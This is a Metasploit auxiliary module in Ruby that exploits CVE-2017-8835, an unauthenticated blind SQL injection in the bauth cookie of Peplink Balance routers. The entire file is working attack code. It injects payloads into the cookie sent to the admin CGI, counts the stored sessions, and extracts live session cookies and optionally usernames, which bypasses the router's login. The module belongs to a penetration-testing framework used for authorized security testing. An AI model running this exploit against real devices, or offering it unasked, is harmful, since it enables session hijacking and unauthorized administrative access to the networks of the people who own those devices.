
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Peplink Balance routers SQLi',
        'Description' => %q{
          Firmware versions up to 7.0.0-build1904 of Peplink Balance routers are affected by an unauthenticated
          SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an
          attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.

          a session expires 4 hours after login
        },
        'Author' =>
          [
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          [
            [ 'EDB', '42130' ],
            [ 'CVE', '2017-8835' ],
          ],
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptBool.new('EnumUsername', [false, 'Retrieve the username associated with the session', false]),
        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil])
      ]
    )
  end

  def perform_sqli
    # Note: using run_sql because there is a limit on the length of our queries
    # will work only if we remove the casts, NULL value handling etc.
    session_count = @sqli.run_sql("select count(1) from sessionsvariables where name='expire'").to_i
    print_status "There are #{session_count} (possibly expired) sessions"

    # limit the number of session cookies to retrieve if the option is set
    session_count = datastore['LimitTries'] if datastore['LimitTries'] && datastore['LimitTries'] < session_count

    admin_ids = session_count.times.map do |i|
      @sqli.run_sql('select id from sessionsvariables ' \
                    "where name='expire' order by cast(value as int) desc limit 1 offset #{i}").to_i
    end

    print_status('Trying the ids from the most recent login')

    admin_ids.each_with_index do |id, idx|
      cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}")
      if datastore['EnumUsername']
        username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
        print_good "Found cookie #{cookie} for user: #{username}"
      else
        print_good "Found cookie #{cookie}"
      end
      break if session_count == idx + 1
    end
  end

  def run
    @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
      res = nil
      loop do
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
          'method' => 'GET',
          'cookie' => "bauth=' or #{payload}--"
        })
        break if res
      end
      !res.headers['Set-Cookie'] # no Set-Cookie header means the session cookie is valid
    end
    if @sqli.test_vulnerable
      print_good 'Target seems vulnerable'
    else
      fail_with 'Target does not seem to be vulnerable'
    end
    perform_sqli
  end
end
